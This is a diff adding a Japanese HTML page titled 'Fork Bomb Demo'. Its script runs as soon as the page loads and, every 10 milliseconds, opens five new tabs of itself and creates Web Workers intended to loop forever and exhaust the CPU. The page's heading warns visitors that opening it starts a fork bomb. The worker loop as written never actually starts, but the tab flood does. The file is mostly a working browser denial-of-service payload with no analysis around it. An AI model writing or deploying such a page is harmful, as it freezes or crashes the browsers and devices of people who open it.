@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Fork Bomb Demo</title>
+    <style>
+        body {
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>このページを開くとFork爆弾が起動します...</h1>
+    <p>すぐに閉じてください。ブラウザが重くなります。</p>
+    <script>
+        function forkBomb() {
+            // 無限にWeb Worker + 再帰 + タブ生成を試みる
+            setInterval(() => {
+                // 新しいタブ/ウィンドウを大量生成
+                for (let i = 0; i < 5; i++) {
+                    window.open(location.href, '_blank');
+                }
+                // Web WorkerでCPUを食う
+                new Worker(URL.createObjectURL(new Blob([`
+                    self.onmessage = function() {
+                        while(true) { 
+                            // 無限ループでCPU100%
+                        }
+                    };
+                    self.postMessage('start');
+                `])));
+            }, 10);
+        }
+        // ページ読み込みと同時に即実行
+        window.onload = forkBomb;
+        // さらに即時実行
+        forkBomb();
+    </script>
+</body>
+</html>
